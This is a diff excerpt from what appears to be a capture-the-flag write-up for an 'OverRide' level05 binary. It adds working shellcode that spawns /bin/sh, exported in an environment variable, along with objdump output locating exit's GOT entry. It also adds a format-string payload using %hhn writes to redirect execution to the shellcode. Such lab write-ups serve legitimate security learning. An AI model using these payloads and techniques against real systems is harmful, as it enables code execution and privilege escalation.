@@ -17,7 +17,29 @@ Let's export our SHELLCODE in an environment variable ;
 
 export SHELLCODE=`python -c "print '\x90' * 500 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
 
+Adress of exit in got :
 
+level05@OverRide:~$ objdump -R level05
+
+level05:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+080497c4 R_386_GLOB_DAT    __gmon_start__
+080497f0 R_386_COPY        stdin
+080497d4 R_386_JUMP_SLOT   printf
+080497d8 R_386_JUMP_SLOT   fgets
+080497dc R_386_JUMP_SLOT   __gmon_start__
+080497e0 R_386_JUMP_SLOT   exit
+080497e4 R_386_JUMP_SLOT   __libc_start_main
+
+exit -> 080497e0
+
+b *main+0 -> r -> x/100wx *environ -> we take the adress 0xffffd7d7 where there is a nop instruction
+
+0xd7 -> 215 
+0xff -> 255
+ 
 (python -c 'print "\xe0\x97\x04\x08\xe1\x97\x04\x08\xe2\x97\x04\x08\xe3\x97\x04\x08%199x%10$hhn%11$hhn%40x%12$hhn%13$hhn"'; cat) | ./level05
 
 $ whoami
